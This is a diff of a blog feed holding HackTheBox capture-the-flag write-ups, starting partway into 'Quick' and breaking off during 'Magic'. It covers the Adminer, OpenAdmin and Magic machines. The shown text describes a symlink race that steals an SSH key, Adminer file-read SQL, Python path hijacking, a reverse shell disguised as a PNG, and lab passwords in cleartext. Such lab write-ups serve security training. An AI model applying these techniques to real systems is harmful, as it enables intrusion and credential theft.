+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/decrypt.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;But it gave the original password back!&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/password.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;port-forwarding&quot;&gt;Port forwarding&lt;/h3&gt;
+&lt;p&gt;Now I need to find a username and some location to use this password. I enumerated more and found another php file named “&lt;strong&gt;000-default.conf&lt;/strong&gt;” in the apache directory which mentions a username &lt;strong&gt;srvadm&lt;/strong&gt; and a virtual host on port 80 by the name &lt;code class=&quot;highlighter-rouge&quot;&gt;printerv2.quick.htb&lt;/code&gt;. I added localhost entry with this domain name in my hosts file and my RSA key in the .ssh/authorized_keys file in sam’s home directory. Then I port forwarded my port 80 to the machine’s port 80 using the command&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 80:127.0.0.1:80 sam@quick.htb &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; key.rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And was able to access and login the website with &lt;strong&gt;srvadmn:yl51pbx&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/printerv2.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;The site had nothing interesting except the “Add Printer” section&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/website.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/website-add.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;race-condition&quot;&gt;Race condition&lt;/h3&gt;
+&lt;p&gt;On enumerating the system, I found a file named &lt;strong&gt;job.php&lt;/strong&gt; inside the &lt;strong&gt;/var/www/printers/&lt;/strong&gt; directory which had a race condition in it.&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/job.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;p&gt;This is actually making a file with the current timestamp and send it to the IP and port specified. I recalled that the “add printer” page had that option to add a printer with a remote port and IP. Upon checking the the specified “jobs” folder, it had all permissions given to it! That means I can create a symlink of srvadm’s SSH key and send it back to my listener. So I created a small script to do that&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/ln.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;p&gt;Then I went to the “Add Printer” section, added my “printer” with my IP and port, ran my symlink script, started my listener, went to &lt;code class=&quot;highlighter-rouge&quot;&gt;printerv2.quick,htb/job.php&lt;/code&gt; and clicked “print”&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/job-assigned.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;p&gt;BAM! I got srvadmin’s SSH key back.&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/rsa.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;I logged-in to srvadm’s account with the key and upon simple enumeration found a configuration file &lt;strong&gt;printers.conf&lt;/strong&gt; in the &lt;strong&gt;.cache/conf.d&lt;/strong&gt; directory which had the root account’s password’s special characters hex encoded&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/root-pass.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;p&gt;I simply decoded it back and got the password &lt;strong&gt;&amp;amp;ftQ4K3SGde8?&lt;/strong&gt;, with which I can login as root!&lt;/p&gt;
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/3911cd3f-88ff-43ab-8977-3bad469595c5qui/root.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;PS: If you noticed the change in IP in some of the pictures, I got bored and started playing DotA for couple of days before continuing this write-up again.&lt;/p&gt;
+
+&lt;hr /&gt;</content><category term="quick" /><category term="ctf" /><category term="linux" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="nmap" /><category term="gobuster" /><category term="http/3" /><category term="quiche" /><category term="wfuzz" /><category term="esigate" /><category term="burp" /><category term="curl" /><category term="xslt" /><category term="mysql" /><category term="netcat" /><category term="nc" /><category term="php" /><category term="md5" /><category term="custom script" /><category term="race condition" /><category term="symlink" /><category term="encoding" /><summary>Hard-level Linux machine</summary></entry><entry><title>“Admirer” Write-up</title><link href="https://xmehulx.github.io/write-ups/admirer/" rel="alternate" type="text/html" title="&quot;**Admirer**&quot; Write-up" /><published>2020-05-06T00:00:00-04:00</published><updated>2020-05-06T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/admirer</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/admirer/">&lt;figure&gt;
+        &lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/info.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;“Admirer” is an easy-level machine created by &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/159204&quot;&gt;polarbearer&lt;/a&gt; and &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/125033&quot;&gt;GibParadox&lt;/a&gt; which focused on PHP Adminer vulnerability to gain credentials for user and then Python path hijacking to gain root as the major step.&lt;/p&gt;
+
+&lt;h2 id=&quot;initial-scan&quot;&gt;Initial Scan&lt;/h2&gt;
+
+&lt;p&gt;Performing the regular nmap scan as &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sCV -A admirer.htb&lt;/code&gt; gave the following result&lt;/p&gt;
+
+&lt;figure&gt;	
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/nmap.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Which gave us a FTP server login (no anonymous login though) and disallowed entry in robots.txt as /admin-dir. I kept that in mind and went to check the website, looked at the source code but nothing interesting popped out as such. So I went to check &lt;strong&gt;/robots.txt&lt;/strong&gt; which had a potential username “&lt;strong&gt;waldo&lt;/strong&gt;”.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/robots.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Next, I checked the /admin-dir directory but got &lt;em&gt;permission denied&lt;/em&gt;, but that doesn’t mean I can’t enumerate it! So I set my gobuster to search for &lt;strong&gt;.txt&lt;/strong&gt; and &lt;strong&gt;.php&lt;/strong&gt; files in that directory and got two files, &lt;strong&gt;/credentials.txt&lt;/strong&gt; and &lt;strong&gt;/contacts.txt&lt;/strong&gt;, one of which contained creds for FTP server.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/credentials.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;ftp-enumeration&quot;&gt;FTP Enumeration&lt;/h2&gt;
+&lt;p&gt;After getting FTP credential, I logged in with that into the FTP server and retrieved the two files it had: &lt;strong&gt;sql.dump&lt;/strong&gt; and &lt;strong&gt;html.tar.gz&lt;/strong&gt;. Even though nothing interesting was found in sql.dump, it told me that the site uses databases to store things, which could come in handy later on. So next I decompressed the &lt;em&gt;GZ&lt;/em&gt; file and there were a lot of things to be examined. The &lt;strong&gt;index.php&lt;/strong&gt; page had a potential password for user waldo but it had a &lt;em&gt;typo&lt;/em&gt; as double-quotes could break the command.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/index.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;So it couldn’t be the creds, but still I saved it in a list of passwords. Next I checked the &lt;strong&gt;/utility-scripts&lt;/strong&gt; and found few PHP files. I checked if the files were still present on the server and they were!&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/web-admin.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;I tried tinkering the value of &lt;em&gt;task&lt;/em&gt; as it was executing a shell command based on the number, but it was well-sanitized :/&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/tasks.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;In the &lt;strong&gt;db_admin.php&lt;/strong&gt;, there was another potential password for user “waldo” (SIGH) but it didn’t work anywhere. But the interesting thing was the last line.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/db_admin.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;But I couldn’t pick up on that, so I looked into the forums for the hints and someone said:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Something very similar to the box name should be your tool for this.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So I searched for “php admirer” and got the open-source database “&lt;strong&gt;Adminer&lt;/strong&gt;”! Then I looked for the Adminer login page which was located at the /utility-scripts directory itself.&lt;/p&gt;
+
+&lt;h2 id=&quot;adminer&quot;&gt;Adminer&lt;/h2&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/adminer.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;It was running on version 4.6.2, so I looked for an exploit in it and found &lt;a href=&quot;https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool&quot;&gt;this&lt;/a&gt; explaining that it could be exploited by connecting it to a remote user on a database (our local database) with all grants which in turn could be used to load a file from the localhost (their remote database).&lt;/p&gt;
+
+&lt;h3 id=&quot;setting-up-sql&quot;&gt;Setting-up SQL&lt;/h3&gt;
+
+&lt;p&gt;This was the part that took one whole day for me to set-up. I don’t know why but mysql (or mariaDB) wasn’t working in my Kali and I had to totally purge it from my system and reinstall it for it to work. If you are having a similar problem, you can refer &lt;a href=&quot;https://computingforgeeks.com/how-to-install-mariadb-on-kali-linux/&quot;&gt;this&lt;/a&gt; guide which helped me.&lt;/p&gt;
+
+&lt;p&gt;By default, mariaDB doesn’t allow remote connections for security reason, so we had to change the config files (refer &lt;a href=&quot;https://mariadb.com/kb/en/configuring-mariadb-for-remote-client-access/&quot;&gt;this&lt;/a&gt;) and restart the service for mariaDB to allow remote connections. You can check whether the bind address has changed from &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat -tlpn&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;setting-up-database&quot;&gt;Setting-up database&lt;/h3&gt;
+
+&lt;p&gt;Now I started mysql and created user and database and granted all permissions to it.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/mariadb.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;you can check the grants by the command &lt;code class=&quot;highlighter-rouge&quot;&gt;show grants for &amp;lt;user&amp;gt;;&lt;/code&gt; to verify you have given the grants. If that doesn’t work you can &lt;code class=&quot;highlighter-rouge&quot;&gt;flush privileges&lt;/code&gt; for the privileges to load again.&lt;/p&gt;
+
+&lt;h3 id=&quot;connect-adminer&quot;&gt;Connect Adminer&lt;/h3&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/connect.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;After logging in, I went to my database and created a new table with a column initialised as follows&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/create_table.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h3 id=&quot;load-local-file&quot;&gt;Load local file&lt;/h3&gt;
+
+&lt;p&gt;Now all that was left was to load the local file into my database my going into “SQL Command” tab and using these statements:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;load data local infile '../index.php'
+into table mehDB.mehTable
+fields terminated by '\n'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This loaded the current index.php file into my table and I finally found the correct creds for waldo this time!&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/real_pass.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;user&quot;&gt;User&lt;/h2&gt;
+
+&lt;p&gt;With this cred I can login as waldo using SSH and get the user flag&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/user.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;root&quot;&gt;Root&lt;/h2&gt;
+
+&lt;p&gt;One of the first things I always check after getting user is what commands can I execute as root. So I checked with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/sudo-l.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;There is one named &lt;strong&gt;admin_tasks.sh&lt;/strong&gt; which also allows to set environment variable. Checking that file I could see there was a python script being called by the name &lt;strong&gt;backup.py&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/admin_tasks.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;And further looking in the backup.py&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/backup.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;This script loads an external script (&lt;strong&gt;shutil.py&lt;/strong&gt;) and makes an archive using function &lt;strong&gt;make_archive()&lt;/strong&gt;. But what’s important is that we can perform &lt;strong&gt;Python path hijacking&lt;/strong&gt; since their is an order in which Python looks for scripts. And since, we can change environment variable, I can create an additonal PYTHONPATH environment variable pointing to my folder which contains maliciuosly crafted shutil.py with same function make_archive().&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/shell.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;p&gt;And since this path is appended at the beginning, Python will load my shutil.py (stored at &lt;strong&gt;/tmp/meh&lt;/strong&gt;) while calling backup.py to give us a shell back as root.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Note: I added three parameters as in the backup.py it’s called with three parameters. So as to avoid unnecessary errors. But it’ll still work without the paramters.&lt;/em&gt;&lt;/p&gt;
+
+&lt;figure&gt;
+        &lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/4b83c688-be1d-4211-b1fc-4cd28e62fd14adm/root_shell.png&quot; /&gt;
+&lt;/figure&gt;
+&lt;hr /&gt;</content><category term="remote" /><category term="ctf" /><category term="linux" /><category term="hackthebox" /><category term="htb" /><category term="write-up" /><category term="robots.txt" /><category term="gobuster" /><category term="FTP" /><category term="python path hijacking" /><category term="adminer vulnerability" /><category term="sql" /><category term="nmap" /><category term="reverse shell" /><summary>Easy-level Linux machine</summary></entry><entry><title>“OpenAdmin” Write-up</title><link href="https://xmehulx.github.io/write-ups/openadmin/" rel="alternate" type="text/html" title="&quot;**OpenAdmin**&quot; Write-up" /><published>2020-05-02T00:00:00-04:00</published><updated>2020-05-02T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/openadmin</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/openadmin/">&lt;figure&gt;
+	&lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/info.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;“OpenAdmin” is an easy-level Linux machine which got retired today. It made use of OpenNetAdmin CVE to gain user and exploit text-editor with root privileges to gain root.&lt;/p&gt;
@@ -9,13 +435,13 @@
 &lt;p&gt;Upon performing a normal nmap scan as &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sCV -A openadmin.htb&lt;/code&gt; we get&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/openadmin/nmap.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/nmap.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;Upon checking the website, it turned to be a default apache page. I checked for all the ports and even that didn’t give anything. After this I tried brute forcing the site with medium wordlist and it gave an interesting page ‘/ona’. When I opened it, I saw that it was an OpenNetAdmin page which was running on an out-dated version. Upon looking it up, there was an exploit available for that exact version. After converting the pre-available file from dos2unix format, I ran it and got the shell!&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/openadmin/ona.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/ona.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
@@ -23,7 +449,7 @@
 &lt;p&gt;But it was an extremely restricted shell and the most I could do at this point was ls and cat. Searching online for its configuration file I found that it it located by default at &lt;em&gt;“/opt/ona/www/config/config.inc.php”&lt;/em&gt;. So after looking at it I found the cred file database_settings.inc.php stored at $dbconffile location, which contained a password, but no username!&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/openadmin/cred1.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/cred1.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;Now I needed to find a username for this password, and after running &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -l /var/www&lt;/code&gt;  I found that there was a user named Jimmy. So got a username and password and got logged in as user &lt;em&gt;jimmy&lt;/em&gt;.&lt;/p&gt;
@@ -31,13 +457,13 @@
 &lt;p&gt;But even this user doesn’t give user flag. So I looked for more users and found a user named “Joanna”. More enumeration was needed and I found /var/www/internal/main.php which prints the RSA key of user Joanna. GREAT! But after requesting the php file, it wasn’t found, strange :/ So I looked up what all ports are running using &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat -tulpn&lt;/code&gt; and found a suspicious high port open at port number 52846. So, I again requested that php file but at this high port number and successfully got Joanna’s RSA key!&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/openadmin/rsa.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/rsa.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;After converting this key to John’s format and running John on the hash we get the following password for Joanna:&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/openadmin/pass.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/pass.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;With which we can log-in as user &lt;em&gt;joanna&lt;/em&gt;.&lt;/p&gt;
@@ -47,10 +473,10 @@
 &lt;p&gt;One of the first things I usually check after getting user flag is what commands I can run as root. So I did the same here and found that I could open nano editor as root. Awesome! Since I can open nano as root, I can read any file (including root.txt file!), by using &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl-x&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/openadmin/root.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cb9732a2-90f5-11ea-bb37-0242ac130002oad/root.png&quot; /&gt;
 &lt;/figure&gt;
-&lt;hr /&gt;</content><category term="servmon" /><category term="ctf" /><category term="windows" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><summary>Easy-level Windows machine</summary></entry><entry><title>“Magic” Write-up</title><link href="https://xmehulx.github.io/write-ups/magic/" rel="alternate" type="text/html" title="&quot;**Magic**&quot; Write-up" /><published>2020-04-22T00:00:00-04:00</published><updated>2020-04-22T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/magic</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/magic/">&lt;figure&gt;
-        &lt;img style=&quot;border-radius:10px&quot; src=&quot;../images/machines/magic/info.png&quot; /&gt;
+&lt;hr /&gt;</content><category term="servmon" /><category term="ctf" /><category term="windows" /><category term="htb" /><category term="hackthebox" /><category term="write-up" /><category term="opennetadmin" /><category term="john" /><category term="rsa" /><category term="nmap" /><category term="sudo" /><category term="netstat" /><category term="ssh" /><summary>Easy-level Windows machine</summary></entry><entry><title>“Magic” Write-up</title><link href="https://xmehulx.github.io/write-ups/magic/" rel="alternate" type="text/html" title="&quot;**Magic**&quot; Write-up" /><published>2020-04-22T00:00:00-04:00</published><updated>2020-04-22T00:00:00-04:00</updated><id>https://xmehulx.github.io/write-ups/magic</id><content type="html" xml:base="https://xmehulx.github.io/write-ups/magic/">&lt;figure&gt;
+        &lt;img style=&quot;border-radius:10px&quot; src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/info.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;“Magic” is a medium-level Linux machine created by &lt;a href=&quot;https://www.hackthebox.eu/home/users/profile/31190&quot;&gt;TRX&lt;/a&gt; which focused on basic SQL injection, file upload vulnerability, SQL database enumeration and exploiting an SUID.&lt;/p&gt;
@@ -60,13 +486,13 @@
 &lt;p&gt;Performing the regular nmap scan &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sCV -A magic.htb&lt;/code&gt; gave the following result&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/nmap.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/nmap.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;So only two ports were open. I headed on to the magic’s webpage where quite some photos were pre-uploaded&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/magic.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/magic.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;The first thought I had was if it was possible to upload a shell as it said to login in order to upload images. So I went to login.&lt;/p&gt;
@@ -76,7 +502,7 @@
 &lt;p&gt;In the login page, I initially tried some common username:password combinations such as admin:admin, user:user, etc, but they didn’t work. Then, I tried the most basic SQL injection &lt;strong&gt;’–:’–&lt;/strong&gt; and it worked! lol. So I went on to uploading the image.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/login.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/login.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;h2 id=&quot;file-upload&quot;&gt;File Upload&lt;/h2&gt;
@@ -86,7 +512,7 @@
 &lt;p&gt;I though of changing the header of a reverse shell to that of a PNG file. For that, I made a small python script which inputs hex into a file and then input the &lt;a href=&quot;https://www.w3.org/TR/PNG-Structure.html&quot;&gt;PNG’s header&lt;/a&gt; into it. Then I got the hex of my reverse shell using &lt;code class=&quot;highlighter-rouge&quot;&gt;hexdump -v -e '/1 &quot;%02X &quot;' &amp;lt;file&amp;gt;&lt;/code&gt; and appended it to the previous file and added the png extension.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/hex.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/hex.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;And it worked! There are other methods as well, you can ping me to know them ;)&lt;/p&gt;
@@ -96,7 +522,7 @@
 &lt;p&gt;I, then navigated to where my image was stored and instantly got a reverse shell back.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/revshell.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/revshell.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;h2 id=&quot;getting-user&quot;&gt;Getting User&lt;/h2&gt;
@@ -104,19 +530,19 @@
 &lt;p&gt;I enumerated the machine a bit and found &lt;strong&gt;db.php5&lt;/strong&gt; at &lt;em&gt;/var/www/Magic&lt;/em&gt;, which contained a cred for user &lt;strong&gt;theseus&lt;/strong&gt;.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/dbtheseus.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/dbtheseus.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;I tried to change user with this cred but it wasn’t the password for Theseus user, but it could be the password for Theseus in the Database! So I dumped the SQL data using the command &lt;code class=&quot;highlighter-rouge&quot;&gt;sqldump&lt;/code&gt; and got another cred for Theseus.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/theseus.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/theseus.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;p&gt;With this cred, I could login as theseus and get the user flag.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/user.png&quot; /&gt;
+	&lt;img src=&quot;https://xmehulx.github.io/write-ups/images/machines/cf8ad3e3-42aa-4e65-9715-b1e13b678b6fmag/user.png&quot; /&gt;
 &lt;/figure&gt;
 
 &lt;h2 id=&quot;getting-root&quot;&gt;Getting Root&lt;/h2&gt;
@@ -124,17 +550,19 @@
 &lt;p&gt;After that I uploaded &lt;em&gt;linpeas&lt;/em&gt; and executed it to find something interesting. To be honest, initially I couldn’t find anything particular other than trying everything which depressed me, so I just compared the linpeas’ info with other linpeas’ to see the difference and found that the binary &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt; was something new (had never heard of this command!). On running it I at once understood that it was using output of 3-4 different commands out of which &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; was one.&lt;/p&gt;
 
 &lt;figure&gt;
-	&lt;img src=&quot;../images/machines/magic/sysinfo.png&quot; /&gt;
